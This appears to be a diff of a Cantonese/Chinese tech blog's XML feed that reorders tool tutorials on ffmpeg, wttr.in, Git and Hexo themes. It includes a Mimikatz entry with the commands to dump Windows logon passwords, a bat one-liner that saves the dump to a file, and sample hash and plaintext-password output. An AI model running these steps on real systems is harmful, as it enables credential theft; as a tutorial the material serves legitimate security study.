+<li><a href="https://ffmpeg.org/ffplay.html">ffplay</a> 是一個簡約的多媒體播放器。</li>
+<li><a href="https://ffmpeg.org/ffprobe.html">ffprobe</a> 是一個簡單的檢查分析工具<br> 多媒體內容。</li>
+<li>其他小工具，如<code>aviocat</code>、<code>ismindex</code> 和<code>qt-faststart</code>。</li>
+</ul>
+<h1 id="下載網路上的影片-需要為未經處理的m3u8檔"><a href="#下載網路上的影片-需要為未經處理的m3u8檔" class="headerlink" title="下載網路上的影片 (需要為未經處理的m3u8檔)"></a>下載網路上的影片 (需要為未經處理的m3u8檔)</h1><p>格式 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i [m3u8 link] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/01/30/git-console-update/update.gif" class="">
+<p>完整示範 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>
 
-<p>完 …</p>
-<h2 id="git-scm"><a href="#git-scm" class="headerlink" title="git-scm"></a>git-scm</h2><p><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p>
+<span id="more"></span>
+
+<hr style="border:2px solid grey"></hr>
+
+<h1 id="使用-user-agent-Bypass-權限問題-403"><a href="#使用-user-agent-Bypass-權限問題-403" class="headerlink" title="使用 user_agent Bypass 權限問題 (403)"></a>使用 user_agent Bypass 權限問題 (403)</h1><p>User Agents : <a href="https://developers.whatismybrowser.com/useragents/explore/">https://developers.whatismybrowser.com/useragents/explore/</a></p>
+<p>格式 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent [User Agents] -i [m3u8 file] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>
+
+<p>完整示範 :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span> -i  file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>
+
+<h1 id="Merging-video-and-audio-with-audio-re-encoding"><a href="#Merging-video-and-audio-with-audio-re-encoding" class="headerlink" title="Merging video and audio, with audio re-encoding"></a>Merging video and audio, with audio re-encoding</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac output.mp4</span><br></pre></td></tr></table></figure>
+
+<h1 id="Copying-the-audio-without-re-encoding"><a href="#Copying-the-audio-without-re-encoding" class="headerlink" title="Copying the audio without re-encoding"></a>Copying the audio without re-encoding</h1><p>If your output container can handle (almost) any codec – like MKV – then you can simply copy both audio and video streams:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c copy output.mkv</span><br></pre></td></tr></table></figure>
+
+<h1 id="Replacing-audio-stream"><a href="#Replacing-audio-stream" class="headerlink" title="Replacing audio stream"></a>Replacing audio stream</h1><p>If your input video already contains audio, and you want to replace it, you need to tell ffmpeg which audio stream to take</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac -map 0:v:0 -map 1:a:0 output.mp4</span><br></pre></td></tr></table></figure>
+
+<p>參考資料:<br><a href="https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg">https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg</a><br><a href="https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/">https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/</a></p>
 ]]></content>
       <categories>
-        <category>Git</category>
+        <category>FFMPEG</category>
       </categories>
       <tags>
         <tag>指令</tag>
@@ -7263,6 +7320,52 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
 <h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/15/github-tools-KickThemOut/kickthemout.png" class="">
 
 <h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>作者已經好耐冇更新，炸人機功能已經冇左，但係佢既 Scan Network 功能仲係好好用。</p>
+]]></content>
+      <categories>
+        <category>Github Tools</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MPS-Youtube - 免開 Browser 睇 Youtube (未打完)</title>
+    <url>/2022/01/29/github-tools-mps-youtube/</url>
+    <content><![CDATA[<h1 id="Linux-成癮"><a href="#Linux-成癮" class="headerlink" title="Linux 成癮"></a>Linux 成癮</h1><p>打指令打到痴撚左線，<br>睇 Youtube 都唔想開 browser，<br>咁就要用佢啦！</p>
+<h2 id="MPS-Youtube"><a href="#MPS-Youtube" class="headerlink" title="MPS-Youtube"></a><a href="https://github.com/mps-youtube/mps-youtube">MPS-Youtube</a></h2><p>佢係一款用多功能集中於 Youtube 既工具</p>
+<h2 id="功能包括有"><a href="#功能包括有" class="headerlink" title="功能包括有"></a>功能包括有</h2><ul>
+<li>Search and play audio/video from YouTube</li>
+<li>Search tracks of albums by album title</li>
+<li>Search and import YouTube playlists</li>
+<li>Create and save local playlists</li>
+<li>Download audio/video</li>
+<li>Convert to mp3 &amp; other formats (requires ffmpeg or avconv)</li>
+<li>View video comments</li>
+<li>Works with Python 3.x</li>
+<li>Works with Windows, Linux and Mac OS X</li>
+<li>Requires mplayer or mpv</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Github Tools</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>wttr.in - 查天氣既工具</title>
+    <url>/2021/12/17/github-tools-wttrin-weather/</url>
+    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>wttr.in 是一種面向控制台的天氣預報服務，<br>它支持各種信息表示方法，<br>例如用於控制台 HTTP 客戶端（curl、httpie 或 wget）的面向終端的 ANSI 序列、<br>用於 Web 瀏覽器的 HTML 或用於圖形查看器的 PNG </p>
+<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
+<li><a href="https://github.com/chubin/wttr.in">https://github.com/chubin/wttr.in</a></li>
+</ul>
+<h2 id="查現時位置天氣"><a href="#查現時位置天氣" class="headerlink" title="查現時位置天氣"></a>查現時位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl wttr.in</span><br><span class="line">Weather <span class="keyword">for</span> City: Paris, France</span><br><span class="line"></span><br><span class="line">     \   /     Clear</span><br><span class="line">      .-.      10 – 11 °C  </span><br><span class="line">   ― (   ) ―   ↑ 11 km/h  </span><br><span class="line">      `-’      10 km  </span><br><span class="line">     /   \     0.0 mm  </span><br></pre></td></tr></table></figure>
+
+<h2 id="查其他位置天氣"><a href="#查其他位置天氣" class="headerlink" title="查其他位置天氣"></a>查其他位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl wttr.in/London</span></span><br></pre></td></tr></table></figure>
+
+<p>搞撚掂 !</p>
+<p><a href="https://lihkg.com/thread/2744877/page/1">https://lihkg.com/thread/2744877/page/1</a></p>
 ]]></content>
       <categories>
         <category>Github Tools</category>
@@ -7323,75 +7426,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
 ]]></content>
       <categories>
         <category>Git</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MPS-Youtube - 免開 Browser 睇 Youtube (未打完)</title>
-    <url>/2022/01/29/github-tools-mps-youtube/</url>
-    <content><![CDATA[<h1 id="Linux-成癮"><a href="#Linux-成癮" class="headerlink" title="Linux 成癮"></a>Linux 成癮</h1><p>打指令打到痴撚左線，<br>睇 Youtube 都唔想開 browser，<br>咁就要用佢啦！</p>
-<h2 id="MPS-Youtube"><a href="#MPS-Youtube" class="headerlink" title="MPS-Youtube"></a><a href="https://github.com/mps-youtube/mps-youtube">MPS-Youtube</a></h2><p>佢係一款用多功能集中於 Youtube 既工具</p>
-<h2 id="功能包括有"><a href="#功能包括有" class="headerlink" title="功能包括有"></a>功能包括有</h2><ul>
-<li>Search and play audio/video from YouTube</li>
-<li>Search tracks of albums by album title</li>
-<li>Search and import YouTube playlists</li>
-<li>Create and save local playlists</li>
-<li>Download audio/video</li>
-<li>Convert to mp3 &amp; other formats (requires ffmpeg or avconv)</li>
-<li>View video comments</li>
-<li>Works with Python 3.x</li>
-<li>Works with Windows, Linux and Mac OS X</li>
-<li>Requires mplayer or mpv</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Github Tools</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wttr.in - 查天氣既工具</title>
-    <url>/2021/12/17/github-tools-wttrin-weather/</url>
-    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>wttr.in 是一種面向控制台的天氣預報服務，<br>它支持各種信息表示方法，<br>例如用於控制台 HTTP 客戶端（curl、httpie 或 wget）的面向終端的 ANSI 序列、<br>用於 Web 瀏覽器的 HTML 或用於圖形查看器的 PNG </p>
-<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
-<li><a href="https://github.com/chubin/wttr.in">https://github.com/chubin/wttr.in</a></li>
-</ul>
-<h2 id="查現時位置天氣"><a href="#查現時位置天氣" class="headerlink" title="查現時位置天氣"></a>查現時位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl wttr.in</span><br><span class="line">Weather <span class="keyword">for</span> City: Paris, France</span><br><span class="line"></span><br><span class="line">     \   /     Clear</span><br><span class="line">      .-.      10 – 11 °C  </span><br><span class="line">   ― (   ) ―   ↑ 11 km/h  </span><br><span class="line">      `-’      10 km  </span><br><span class="line">     /   \     0.0 mm  </span><br></pre></td></tr></table></figure>
-
-<h2 id="查其他位置天氣"><a href="#查其他位置天氣" class="headerlink" title="查其他位置天氣"></a>查其他位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl wttr.in/London</span></span><br></pre></td></tr></table></figure>
-
-<p>搞撚掂 !</p>
-<p><a href="https://lihkg.com/thread/2744877/page/1">https://lihkg.com/thread/2744877/page/1</a></p>
-]]></content>
-      <categories>
-        <category>Github Tools</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>唔同既 Linux Terminal 工具</title>
-    <url>/2022/01/12/different-terminal-with-linux/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>成日用黎用去都係 Default 既 Linux Terminal 想轉下其他 Terminal？</p>
-<p>以下介紹幾款！</p>
-<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><ul>
-<li><a href="https://konsole.kde.org/">Konsole</a> - KDE’s Terminal Emulator</li>
-<li><a href="https://terminator-gtk3.readthedocs.io/en/latest/">Terminator</a> - simplest Terminator</li>
-</ul>
-<h2 id="下載-Konsole"><a href="#下載-Konsole" class="headerlink" title="下載 Konsole"></a>下載 Konsole</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install konsole -y</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/12/different-terminal-with-linux/icon_konsole.png" class="">
-
-<h2 id="下載-Terminator"><a href="#下載-Terminator" class="headerlink" title="下載 Terminator"></a>下載 Terminator</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install terminator -y</span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/12/different-terminal-with-linux/icon_terminator.png" class="">]]></content>
-      <categories>
-        <category>Linux</category>
       </categories>
       <tags>
         <tag>指令</tag>
@@ -7477,54 +7511,20 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>FFmpeg - 影片 / 音樂 轉換格式 / 下載影片 工具</title>
-    <url>/2021/12/11/ffmpeg-command/</url>
-    <content><![CDATA[<h1 id="FFMPEG"><a href="#FFMPEG" class="headerlink" title="FFMPEG"></a>FFMPEG</h1><p>FFmpeg 是處理多媒體內容（例如音頻、視頻、字幕和相關元數據）的庫和工具的集合。</p>
-<h2 id="Libraries"><a href="#Libraries" class="headerlink" title="Libraries"></a>Libraries</h2><ul>
-<li><code>libavcodec</code> 提供了更廣泛的編解碼器的實現。</li>
-<li><code>libavformat</code> 實現流協議、容器格式和基本 I/O 訪問。</li>
-<li><code>libavutil</code> 包括散列器、解壓縮器和其他實用功能。</li>
-<li><code>libavfilter</code> 提供了通過連接過濾器的有向圖來改變解碼的音頻和視頻的方法。</li>
-<li><code>libavdevice</code> 提供了訪問捕獲和播放設備的抽象。</li>
-<li><code>libswresample</code> 實現音頻混合和重採樣例程。</li>
-<li><code>libswscale</code> 實現顏色轉換和縮放例程。</li>
-</ul>
-<p>＃＃ 工具</p>
-<ul>
-<li><a href="https://ffmpeg.org/ffmpeg.html">ffmpeg</a> 是一個命令行工具箱<br> 操作、轉換和流式傳輸多媒體內容。</li>
-<li><a href="https://ffmpeg.org/ffplay.html">ffplay</a> 是一個簡約的多媒體播放器。</li>
-<li><a href="https://ffmpeg.org/ffprobe.html">ffprobe</a> 是一個簡單的檢查分析工具<br> 多媒體內容。</li>
-<li>其他小工具，如<code>aviocat</code>、<code>ismindex</code> 和<code>qt-faststart</code>。</li>
-</ul>
-<h1 id="下載網路上的影片-需要為未經處理的m3u8檔"><a href="#下載網路上的影片-需要為未經處理的m3u8檔" class="headerlink" title="下載網路上的影片 (需要為未經處理的m3u8檔)"></a>下載網路上的影片 (需要為未經處理的m3u8檔)</h1><p>格式 :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i [m3u8 link] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>
+    <title>Git - 更新</title>
+    <url>/2022/01/30/git-console-update/</url>
+    <content><![CDATA[<h1 id="點-update"><a href="#點-update" class="headerlink" title="點 update ?"></a>點 update ?</h1><p>呢個方法只係接受喺 <a href="https://git-scm.com/">git-scm</a> 下載既。<br>如果係用 Package Manager 就唔係咁更新。</p>
+<p>只需要跟返你用緊既 Package manager，<br>再 upgrade 就得 ~</p>
+<p>只需要打</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git update</span><br></pre></td></tr></table></figure>
 
-<p>完整示範 :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -i file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>
+<img src="/2022/01/30/git-console-update/update.gif" class="">
 
-<span id="more"></span>
-
-<hr style="border:2px solid grey"></hr>
-
-<h1 id="使用-user-agent-Bypass-權限問題-403"><a href="#使用-user-agent-Bypass-權限問題-403" class="headerlink" title="使用 user_agent Bypass 權限問題 (403)"></a>使用 user_agent Bypass 權限問題 (403)</h1><p>User Agents : <a href="https://developers.whatismybrowser.com/useragents/explore/">https://developers.whatismybrowser.com/useragents/explore/</a></p>
-<p>格式 :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent [User Agents] -i [m3u8 file] -c copy [output name.mp4]</span><br></pre></td></tr></table></figure>
-
-<p>完整示範 :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffmpeg -user_agent <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36&quot;</span> -i  file.m3u8 -c copy file.mp4</span><br></pre></td></tr></table></figure>
-
-<h1 id="Merging-video-and-audio-with-audio-re-encoding"><a href="#Merging-video-and-audio-with-audio-re-encoding" class="headerlink" title="Merging video and audio, with audio re-encoding"></a>Merging video and audio, with audio re-encoding</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac output.mp4</span><br></pre></td></tr></table></figure>
-
-<h1 id="Copying-the-audio-without-re-encoding"><a href="#Copying-the-audio-without-re-encoding" class="headerlink" title="Copying the audio without re-encoding"></a>Copying the audio without re-encoding</h1><p>If your output container can handle (almost) any codec – like MKV – then you can simply copy both audio and video streams:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c copy output.mkv</span><br></pre></td></tr></table></figure>
-
-<h1 id="Replacing-audio-stream"><a href="#Replacing-audio-stream" class="headerlink" title="Replacing audio stream"></a>Replacing audio stream</h1><p>If your input video already contains audio, and you want to replace it, you need to tell ffmpeg which audio stream to take</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i video.mp4 -i audio.wav -c:v copy -c:a aac -map 0:v:0 -map 1:a:0 output.mp4</span><br></pre></td></tr></table></figure>
-
-<p>參考資料:<br><a href="https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg">https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg</a><br><a href="https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/">https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/</a></p>
+<p>完 …</p>
+<h2 id="git-scm"><a href="#git-scm" class="headerlink" title="git-scm"></a>git-scm</h2><p><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p>
 ]]></content>
       <categories>
-        <category>FFMPEG</category>
+        <category>Git</category>
       </categories>
       <tags>
         <tag>指令</tag>
@@ -7753,6 +7753,29 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Hexo Themes - Next</title>
+    <url>/2022/02/17/hexo-themes-next/</url>
+    <content><![CDATA[<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-npm"></i> NPM Install</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-git-square"></i> Git Install</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote>
+<p>npm 安裝唔會喺 themes folder，而會出現喺 node_modules</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-theme-next@latest</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><blockquote>
+<p>推薦安裝方法 git</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+<h1 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改 _config.yml"></a>修改 <code>_config.yml</code></h1><p>拉到最底搵 <code>theme:</code></p>
+<p>將佢改做</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Next Themes</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+        <tag>網站</tag>
+        <tag>Framework</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hexo - 安裝設置字數統計和預計閱讀時間</title>
     <url>/2021/12/11/hexo-plugins-symbols-count-time/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>呢篇文會以 <a href="https://theme-next.js.org/">Next Theme</a> 做示範，<br>每個 Theme 做既野都大同小異，<br>所以唔洗太膽心。</p>
@@ -7780,29 +7803,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       <tags>
         <tag>指令</tag>
         <tag>安裝</tag>
-        <tag>網站</tag>
-        <tag>Framework</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo Themes - Next</title>
-    <url>/2022/02/17/hexo-themes-next/</url>
-    <content><![CDATA[<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1"><i class="fab fa-npm"></i> NPM Install</button></li><li class="tab"><button type="button" data-href="#test1-2"><i class="fab fa-git-square"></i> Git Install</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote>
-<p>npm 安裝唔會喺 themes folder，而會出現喺 node_modules</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-theme-next@latest</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><blockquote>
-<p>推薦安裝方法 git</p>
-</blockquote>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
-
-<h1 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改 _config.yml"></a>修改 <code>_config.yml</code></h1><p>拉到最底搵 <code>theme:</code></p>
-<p>將佢改做</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Next Themes</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
         <tag>網站</tag>
         <tag>Framework</tag>
       </tags>
@@ -8213,6 +8213,37 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       <tags>
         <tag>指令</tag>
         <tag>Search</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mimikatz - 強行爆破 Windows 密碼的工具</title>
+    <url>/2022/01/07/mimikatz-command/</url>
+    <content><![CDATA[<img src="mimikatz-logo.svg" width="200" height="200">
+
+<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Mimikatz 使用 Windows 上的管理員權限以明文形式顯示當前登錄用戶的密碼。<br>Mimikatz 是一套開源的工具，原始碼在GitHub中你都可以找到，而作者是一名法國人名叫Benjamin Delpy，所以mimikatz的語法與一些用法的描述都是法文，而Mimikatz這個專案，作者仍然是一直有再持續更新。</p>
+<blockquote>
+<p>Mimikatz uses admin rights on Windows to display passwords of currently logged in users in plaintext.<br>Mimikatz is a set of open source tools. You can find the source code in GitHub.<br>And the author is a Frenchman named Benjamin Delpy,<br>So mimikatz’s grammar and some usage descriptions are all in French.<br>As for the Mimikatz project, the author still has been continuously updating it. </p>
+</blockquote>
+<p>Github : <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>使用系統管理員 (system administrator) 開啟程式後 輸入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<p>顯示 <code>Privilege &#39;20&#39; OK</code> 後再輸入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>成功，如下圖</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  .#####.   mimikatz 2.0 alpha (x86) release &quot;Kiwi en C&quot; (Apr  6 2014 22:02:03)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># / \ ##  /* * *</span></span></span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span></span><br><span class="line"> &#x27;## v ##&#x27;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  &#x27;#####&#x27;                                    with  13 modules * * */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"> </span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"> </span><br><span class="line">Authentication Id : 0 ; 515764 (00000000:0007deb4)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : Gentil Kiwi</span><br><span class="line">Domain            : vm-w7-ult-x</span><br><span class="line">SID               : S-1-5-21-1982681256-1210654043-1600862990-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * LM       : d0e9aee149655a6075e4540af1f22d3b</span><br><span class="line">         * NTLM     : cc36cf7a8514893efccd332446158b1a</span><br><span class="line">         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * Password : waza1234/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h1 id="快速達成目標"><a href="#快速達成目標" class="headerlink" title="快速達成目標"></a>快速達成目標</h1><p>bat file</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt;&gt; c:\info.txt</span><br></pre></td></tr></table></figure>
+
+<p>參考資料 :<br><a href="https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html">https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html</a><br><a href="https://ithelp.ithome.com.tw/articles/10217688">https://ithelp.ithome.com.tw/articles/10217688</a><br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement">https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement</a><br><a href="https://www.twblogs.net/a/5b822de72b717737e032d650">https://www.twblogs.net/a/5b822de72b717737e032d650</a><br><a href="https://www.nigesb.com/introduction-of-mimikatz.html">https://www.nigesb.com/introduction-of-mimikatz.html</a></p>
+]]></content>
+      <categories>
+        <category>Kali</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
       </tags>
   </entry>
   <entry>
@@ -9342,37 +9373,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Mimikatz - 強行爆破 Windows 密碼的工具</title>
-    <url>/2022/01/07/mimikatz-command/</url>
-    <content><![CDATA[<img src="mimikatz-logo.svg" width="200" height="200">
-
-<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>Mimikatz 使用 Windows 上的管理員權限以明文形式顯示當前登錄用戶的密碼。<br>Mimikatz 是一套開源的工具，原始碼在GitHub中你都可以找到，而作者是一名法國人名叫Benjamin Delpy，所以mimikatz的語法與一些用法的描述都是法文，而Mimikatz這個專案，作者仍然是一直有再持續更新。</p>
-<blockquote>
-<p>Mimikatz uses admin rights on Windows to display passwords of currently logged in users in plaintext.<br>Mimikatz is a set of open source tools. You can find the source code in GitHub.<br>And the author is a Frenchman named Benjamin Delpy,<br>So mimikatz’s grammar and some usage descriptions are all in French.<br>As for the Mimikatz project, the author still has been continuously updating it. </p>
-</blockquote>
-<p>Github : <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
-<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>使用系統管理員 (system administrator) 開啟程式後 輸入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
-
-<p>顯示 <code>Privilege &#39;20&#39; OK</code> 後再輸入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p>成功，如下圖</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  .#####.   mimikatz 2.0 alpha (x86) release &quot;Kiwi en C&quot; (Apr  6 2014 22:02:03)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># / \ ##  /* * *</span></span></span><br><span class="line"><span class="meta"> #</span><span class="bash"><span class="comment"># \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span></span><br><span class="line"> &#x27;## v ##&#x27;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  &#x27;#####&#x27;                                    with  13 modules * * */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"> </span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line"> </span><br><span class="line">Authentication Id : 0 ; 515764 (00000000:0007deb4)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : Gentil Kiwi</span><br><span class="line">Domain            : vm-w7-ult-x</span><br><span class="line">SID               : S-1-5-21-1982681256-1210654043-1600862990-1000</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * LM       : 